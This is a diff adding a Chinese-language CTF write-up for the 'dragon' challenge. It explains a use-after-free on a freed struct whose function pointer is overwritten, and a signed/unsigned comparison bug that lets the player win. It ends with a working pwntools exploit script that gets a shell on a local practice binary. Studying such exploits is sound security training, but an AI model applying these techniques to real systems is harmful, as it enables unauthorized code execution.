@@ -669,6 +669,54 @@ subprocess.Popen(['/home/otp/otp', ''], stderr=subprocess.STDOUT)
 
 flag: *Darn... I always forget to check the return value of fclose() :(*
 
+## dragon
+
+```
+XXXAttack:
+	free(dragon_info);
+if win:
+	p = malloc(0x10);
+	scanf("%16s", p);
+	(*dragon_info)(dragon_info);
+else:
+	return
+```
+
+由于free(dragon)之后，如果赢得话，将立马malloc(0x10)，输入名字，这时候dragon_info将可控，然后执行*dragon_info(dragon_info)。
+
+由以上伪代码，我们可以看出，只要能够击败龙，就可以在输入name时，输入call system的地址，即可getshell。
+
+记录怪物血量的变量是`BYTE`类型的，也就是`unsigned char`类型。与它比较的0默认情况是`signed int`。
+
+```
+while ( *((_BYTE *)dragon_info + 8) > 0 ); // 这里的0 是signed int类型
+```
+
+在c语言中不同类型的变量做比较会进行隐式类型转换，短长度类型会向较长长度类型转换，长度一致符号不同则向无符号转换，整数会向float转换，float会向double转换。
+那么这里的比较，`BYTE`就会向`signed int`转换。如果此时怪物血量为`128`,转换为二进制就是`10000000`,那么进行符号扩展时就变成了`0xffffff80`,而这个数其符号位为`1`所以是个负数，那么函数就会跳出循环并返回`1`，也就是取得胜利。
+
+综上，payload如下:
+
+```
+from pwn import *
+
+p = process("./dragon")
+
+for i in range(4):
+    p.sendline("1")
+for i in range(4):
+    p.sendline("3\n3\n2")
+
+p.recvuntil("You As:\n")
+
+target_address = 0x08048DBF
+p.sendline(p32(target_address))
+
+p.interactive()
+```
+
+
+
 
 
 
